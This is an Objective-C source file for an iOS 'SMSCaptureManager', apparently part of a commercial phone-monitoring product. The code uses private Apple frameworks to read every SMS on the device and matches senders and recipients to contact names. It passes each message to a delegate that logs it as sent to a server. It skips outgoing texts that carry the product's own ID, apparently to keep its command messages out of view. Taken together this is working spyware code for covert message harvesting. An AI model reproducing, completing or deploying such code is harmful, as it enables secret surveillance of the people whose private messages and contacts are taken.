/**
 - Project name :  SMSCapture Maanager 
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For SMS Capturing Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SMSCaptureManager-E.h"
#import "CTMessagePart.h"
#import "CTMessageCenter.h"
#import "CTMessage.h"
#import "CTMessageAddress-Protocol.h"
#import "FXLogger.h"
#import "FxEventEnums.h"
#import "FxSmsEvent.h"
#import "FxRecipient.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "SMSNotifier.h"
#import "FMDatabase.h"
#import "CKDBMessage.h"
#import "CKDBMessage+iOS8.h"

#import "IMDMessageStore.h"
#import "IMMessageItem.h"

#import <dlfcn.h>

#import <UIKit/UIKit.h>

@interface SMSCaptureManager (PrivateAPI) 
- (NSString *) getProductIdAndVersion;
- (BOOL) isSmsContainProductIDAndVersion: (NSString*) aSms;

- (void) contactWithSMSEvent: (FxSmsEvent *) aSMSEvent;
- (void) smsEventDidFinish: (FxSmsEvent *) aSMSEvent;
- (void) smsEventsDidFinish: (NSArray *) aSMSEvents;
- (void) flashSmsEvents;
@end

@implementation SMSCaptureManager

@synthesize mAppContext;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the SMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate	= aEventDelegate;
		mSMSEventPool	= [[NSMutableArray alloc] init];
	}
	return self;
}

- (BOOL) isSmsContainProductIDAndVersion: (NSString*) aSms {
	NSRange result = [aSms rangeOfString:[self getProductIdAndVersion]];
	BOOL isContain = TRUE;
	if ((result.location == NSNotFound) && 
		(result.length == 0 )) {
		isContain = FALSE;
	}
	return isContain;
}

- (void)captureSMS
{
    //Process last SMS to FxSmsEvent
    //Get last captured SMS timestamp and array
    NSInteger lastSMSlTimeStamp = -1;
    NSArray *lastSMSIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastSMSs.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastSMSsDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastSMSlTimeStamp = [lastSMSsDic[@"lastSMSTimeStamp"] integerValue];
        lastSMSIDs = lastSMSsDic[@"lastSMSIDs"];
    }
    
    NSMutableArray *captureSMSIDArray = [NSMutableArray array];
    __block NSInteger captureSMSTimeStamp = -1;
    
    //For first time capture the lastest SMS
    if (lastSMSlTimeStamp == -1) {
        NSMutableArray *allSmsArray = [SMSCaptureManager smsObjectsFromeFramework];
        if (allSmsArray.count > 0) {
            CKDBMessage *lastestSMS =  allSmsArray[0];
            [self processSMSObject:lastestSMS];
            [captureSMSIDArray addObject:[NSNumber numberWithInt:lastestSMS.identifier]];
            captureSMSTimeStamp = [lastestSMS.date timeIntervalSince1970];
        }
    }
    else {//After first time we have to check all SMSs that newer than last timestamp
        NSMutableArray *allSmsArray = [SMSCaptureManager uncapturedSmsObjectsFromeFramework];
        
        [allSmsArray enumerateObjectsUsingBlock:^(CKDBMessage *sms, NSUInteger idx, BOOL *stop) {
            __block BOOL isCaptured = NO;
            int smsUniqueID = sms.identifier;
            
            if ([sms.date timeIntervalSince1970] >= lastSMSlTimeStamp) {
                [lastSMSIDs enumerateObjectsUsingBlock:^(NSNumber *capturedSMSUniqueID, NSUInteger idx, BOOL *stop) {
                    if ([capturedSMSUniqueID intValue] == smsUniqueID) {
                        isCaptured = YES;
                        *stop = YES;
                    }
                }];
                
                if (!isCaptured) {
                    [self processSMSObject:sms];
                    [captureSMSIDArray addObject:[NSNumber numberWithInt:smsUniqueID]];
                    
                    if (captureSMSTimeStamp == -1 ){
                        captureSMSTimeStamp = [sms.date timeIntervalSince1970];
                    }
                }
            }
        }];
    }
    
    if (captureSMSTimeStamp > -1 && captureSMSIDArray.count > 0) {
        NSDictionary *lastSMSsDic = @{@"lastSMSTimeStamp": [NSNumber numberWithInteger:captureSMSTimeStamp],
                                      @"lastSMSIDs" : captureSMSIDArray};
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastSMSs.plist"];
        
        [lastSMSsDic writeToFile:path atomically:YES];
    }
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/
- (void) processSMSObject: (CKDBMessage*) aMessage {
	DLog (@"Captured SMS message..");
    
    FxSmsEvent *smsEvent= [SMSCaptureManager createSmsEventFromMessage:aMessage];
    
    DLog (@"message     : %@", aMessage.text);
    DLog (@"product id  : %@", [self getProductIdAndVersion]);
    
    //=============SEND SMS EVENT==============================================================================
    
    BOOL shouldSendSMSEvent = FALSE;
    
    if (!aMessage.isOutgoing) {		// capture all incomming SMS
        DLog (@"DEBUG: incomming sms so SEND IT !!!")
        shouldSendSMSEvent = TRUE;
    } else if (aMessage.isOutgoing) {	// not capture outgoing SMS that contains PID and version
        DLog (@"DEBUG: outgoing sms")
        if (![self isSmsContainProductIDAndVersion:aMessage.text]) {
            shouldSendSMSEvent = TRUE;
            DLog (@"DEBUG: but it doesn't contain PID and version, so SEND IT !!!")
        }
    } else {
        DLog (@"wrong SMS type")
    }
    
    if (shouldSendSMSEvent) {
        
        if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
            [mEventDelegate performSelector:@selector(eventFinished:) withObject:smsEvent withObject:self];
            DLog (@"Send SMS event to the server")
            //======================================================Print Result==========================================
            NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Message:%@,Recipients:%@,Direction:%d,DateTime:%@....\n",
                                    [smsEvent contactName],[smsEvent senderNumber],[smsEvent smsData],[smsEvent recipientArray],[smsEvent direction],[DateTimeFormat phoenixDateTime]];
            DLog(@"Log level: %d, resultString: %@",kFxLogLevelDebug,resultString);
            //============================================================================================================
        }
    }
    
    //================= PRINT LOG ============================================================================================
    DLog (@"Sender Number       : %@", [smsEvent senderNumber]);
    DLog (@"Sender Name         : %@", [smsEvent contactName]);
    DLog (@"SMS Subject         : %@", [smsEvent smsSubject]);
    DLog (@"SMS Text            : %@", [smsEvent smsData]);
    DLog (@"SMS conversation id : %@",[smsEvent mConversationID]);
    DLog (@"Direction           : %u",[smsEvent direction]);
    
    DLog (@"Recipient Info...")
    for (FxRecipient *aRecipient in [smsEvent recipientArray]){
        DLog (@"Recipient Name  :%@",[aRecipient recipContactName])
        DLog (@"Recipient Number:%@",[aRecipient recipNumAddr])
    }
    
    [smsEvent release];
    smsEvent=nil;

}

/**
 - Method name:getProductIdAndVersion
 - Purpose: This is method is used to get product information .
 - Argument list and description: No argument
 - Return type and description: pidAndVersion (NSString *)
*/

- (NSString *) getProductIdAndVersion {
	id <ProductInfo> info=[mAppContext getProductInfo];
	NSString *pidAndVersion=[NSString stringWithFormat:@"[%ld %@]", (long)[info getProductID], [info getProductVersion]];
	DLog (@"[ProductId Version]:%@",pidAndVersion);
	return pidAndVersion;
}

- (void) contactWithSMSEvent: (FxSmsEvent *) aSMSEvent {
	ABContactsManager *contactManager=[[ABContactsManager alloc] init];
	if ([aSMSEvent direction] == kEventDirectionIn) {
		DLog (@"Incoming sms");
		NSString *senderNumber = [aSMSEvent senderNumber];
		senderNumber = [senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
		NSString *contactName = [contactManager searchFirstNameLastName:senderNumber];
		[aSMSEvent setContactName:contactName];
	} else if ([aSMSEvent direction] == kEventDirectionOut) {
        DLog(@"##########################################################################")
        DLog(@"                         OUTGOING SMS iOS 6,7,8")
        DLog(@"##########################################################################")
		for (FxRecipient *recipient in [aSMSEvent recipientArray]) {
			NSString *recipientNumber = [recipient recipNumAddr];
			recipientNumber = [recipientNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
			//NSString *contactName = [contactManager searchFirstNameLastName:recipientNumber];
            NSString *contactName = [contactManager searchFirstNameLastName:recipientNumber contactID:-1];
			[recipient setRecipContactName:contactName];
		}
	}
	[contactManager release];
}

+ (FxSmsEvent *)createSmsEventFromMessage:(CKDBMessage *)aMassage
{
    ABContactsManager *contactManager=[[ABContactsManager alloc] init];
    FxSmsEvent *smsEvent=[[FxSmsEvent alloc]init];
    //=============SMS SUBJECT=================================================================================
    [smsEvent setSmsSubject:aMassage.subject];
    //=============SMS TEXT====================================================================================
    [smsEvent setSmsData:aMassage.text];
    //=============SMS TYPE====================================================================================
    [smsEvent setEventType:kEventTypeSms];
    //=============DATETIME====================================================================================
    [smsEvent setDateTime:[DateTimeFormat phoenixDateTime:aMassage.date]];
    //=============Contact Ino=================================================================================
    NSArray *contactInfo = aMassage.recipients;
    //=============Conversation ID ============================================================================
    [smsEvent setMConversationID:aMassage.groupID];
    
    if (!aMassage.isOutgoing) {
        DLog(@"##########################################################################")
        DLog(@"                         INCOMING iOS 6,7,8")
        DLog(@"##########################################################################")
        // -- set Sender Details
        [smsEvent setDirection:kEventDirectionIn];
        NSString *senderNumber=[contactInfo objectAtIndex:0];
        [smsEvent setSenderNumber:[contactManager formatSenderNumber:senderNumber]];
        senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
        //[smsEvent setContactName:[contactManager searchContactName:senderNumber]];
        //[smsEvent setContactName:[contactManager searchFirstNameLastName:senderNumber]];
        [smsEvent setContactName:[contactManager searchFirstNameLastName:senderNumber contactID:-1]];
    }
    else {
        [smsEvent setDirection:kEventDirectionOut]; //set Recipient Details
        for(NSString *senderNumber in contactInfo) {
            FxRecipient *recipient=[[FxRecipient alloc] init];
            [recipient setRecipType:kFxRecipientTO];
            senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
            [recipient setRecipNumAddr:[contactManager formatSenderNumber:senderNumber]];
            //[recipient setRecipContactName:[contactManager searchContactName:senderNumber]];
            [recipient setRecipContactName:[contactManager searchFirstNameLastName:senderNumber]];
            [smsEvent addRecipient:recipient];
            [recipient release];
        }
    }
    
    [contactManager release];
    contactManager = nil;
    
    return smsEvent;
}

- (void) flashSmsEvents {
	DLog (@"Grouping sms & flashing");
    NSMutableArray *allSMSArray = [SMSCaptureManager smsObjectsFromeFramework];;
    
    [allSMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    [allSMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
        FxSmsEvent *smsEvent= [SMSCaptureManager createSmsEventFromMessage:message];
        [mSMSEventPool addObject:smsEvent];
        [smsEvent release];
    }];
    
	NSMutableDictionary *smsGroups = [[NSMutableDictionary alloc] init];
	for (FxSmsEvent *smsEvent in mSMSEventPool) {
		NSNumber *groupID = [NSNumber numberWithUnsignedInteger:[smsEvent eventId]];
		NSMutableArray *group = [smsGroups objectForKey:groupID];
		if (!group) {
			group = [[NSMutableArray alloc] initWithObjects:smsEvent, nil];
			[smsGroups setObject:group forKey:groupID];
			[group release];
		} else {
			[group addObject:smsEvent];
		}
	}
	[mSMSEventPool removeAllObjects];
	
	NSArray *group = nil;
	
	// Method 1
//	NSEnumerator *enumerator = [smsGroups objectEnumerator];
//	while (group = [enumerator nextObject]) {
	
	// Method 2
	NSMutableArray *allKeys = [[NSMutableArray alloc] initWithArray:[smsGroups allKeys]];
	[allKeys sortUsingSelector:@selector(compare:)];
	DLog (@"allKeys in smsGroups = %@", allKeys);
	NSEnumerator *enumerator = [allKeys objectEnumerator];
	NSNumber *key = nil;
	while (key = [enumerator nextObject]) {
		DLog (@"key of group = %@", key);
		group = [smsGroups objectForKey:key];
		
		NSInteger index = 0;
		for (FxSmsEvent *smsEvent in group) {
			if ([smsEvent direction] == kEventDirectionOut) {
				FxRecipient *recipient = [[smsEvent recipientArray] objectAtIndex:index];
				NSMutableArray *recipients = [[NSMutableArray alloc] initWithObjects:recipient, nil];
				[smsEvent setRecipientArray:recipients];
				[recipients release];
				index++;
			}
			
			DLog (@"*********************************************************");
			DLog (@"ROWID       = %lu", (unsigned long)[smsEvent eventId]);
			DLog (@"time        = %@", [smsEvent dateTime]);
			DLog (@"sender      = %@", [smsEvent senderNumber]);
			DLog (@"name        = %@", [smsEvent contactName]);
			DLog (@"text        = %@", [smsEvent smsData]);
			DLog (@"subject     = %@", [smsEvent smsSubject]);
			DLog (@"recipients  = %@", [smsEvent recipientArray]);
			DLog (@"direction   = %d", [smsEvent direction]);
			DLog (@"*********************************************************");
			
			// Deliver event to server -------------------
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:smsEvent withObject:self];
			}
		}
	}
	[allKeys release];
	[smsGroups release];
}

- (oneway void) release
{
	DLog (@"########## release ");
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[super release];
}


#pragma mark - Historical SMS

+ (NSMutableArray *)smsObjectsFromeFramework
{
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    // get id of last SMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();

    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *allSMSArray = [[NSMutableArray alloc] init];
    
    for (int recordID = 0; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
        
        DLog(@"IMRECORD %@", imdMessageRecordArray);
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            
            if (message) {
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                //Check condition to filter only SMS
                if (message.text.length > 0 && [message.madridService isEqualToString:@"SMS"] && message.subject.length == 0 && message.mediaObjects.count == 0 && messageItem.errorCode == 0) {
                    [allSMSArray addObject:message];
                }
            }
            
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    dlclose(libHandle);
    [allSMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [allSMSArray autorelease];
}

+ (NSMutableArray *)uncapturedSmsObjectsFromeFramework
{
    NSInteger lastSMSTimeStamp = -1;
    NSArray *lastSMSIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastSMSs.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastSMSsDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastSMSTimeStamp = [lastSMSsDic[@"lastSMSTimeStamp"] integerValue];
        lastSMSIDs = lastSMSsDic[@"lastSMSIDs"];
    }
    
    int lastSMSID = [[[lastSMSIDs sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"self" ascending:NO]]] firstObject] intValue];
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    // get id of last SMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();
    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *allSMSArray = [[NSMutableArray alloc] init];
    
    for (int recordID = lastSMSID; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
        
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            if (message) {
                //Check condition to filter only SMS
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                
                if (message.text.length > 0 && [message.madridService isEqualToString:@"SMS"] && message.subject.length == 0 && message.mediaObjects.count == 0 && messageItem.errorCode == 0) {
                    [allSMSArray addObject:message];
                }
                
            }
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    dlclose(libHandle);
    [allSMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [allSMSArray autorelease];
}

+ (NSArray *) allSMSs {
    NSArray *smsLogs = [NSArray array];
    @try {
        NSMutableArray *allSMSArray = [SMSCaptureManager smsObjectsFromeFramework];
        NSMutableArray *sortedSMSEventArray = [[NSMutableArray alloc] init];
        
        [allSMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [allSMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxSmsEvent *smsEvent= [SMSCaptureManager createSmsEventFromMessage:message];
            [sortedSMSEventArray addObject:smsEvent];
            [smsEvent release];
        }];
        
        smsLogs = [NSArray arrayWithArray:sortedSMSEventArray];
        [sortedSMSEventArray release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return smsLogs;
}

+ (NSArray *) allSMSsWithMax: (NSInteger) aMaxNumber {
    NSArray *smsLogs = [NSArray array];
    @try {
        NSMutableArray *allSMSArray = [SMSCaptureManager smsObjectsFromeFramework];
        NSMutableArray *sortedSMSEventArray = [[NSMutableArray alloc] init];
        
        [allSMSArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [allSMSArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxSmsEvent *smsEvent= [SMSCaptureManager createSmsEventFromMessage:message];
            [sortedSMSEventArray addObject:smsEvent];
            [smsEvent release];
        }];
        
        if (aMaxNumber > sortedSMSEventArray.count) {
            aMaxNumber = sortedSMSEventArray.count;
        }
        
        smsLogs = [NSArray arrayWithArray:[sortedSMSEventArray subarrayWithRange:NSMakeRange(0, aMaxNumber)]];
        [sortedSMSEventArray release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return smsLogs;
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastSMSs.plist"] error:&error]) {
        DLog(@"Remove last SMS plist error with %@", [error localizedDescription]);
    }
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	DLog (@"########## dealloc ");
	[mSMSEventPool release];
    [super dealloc];
}

@end
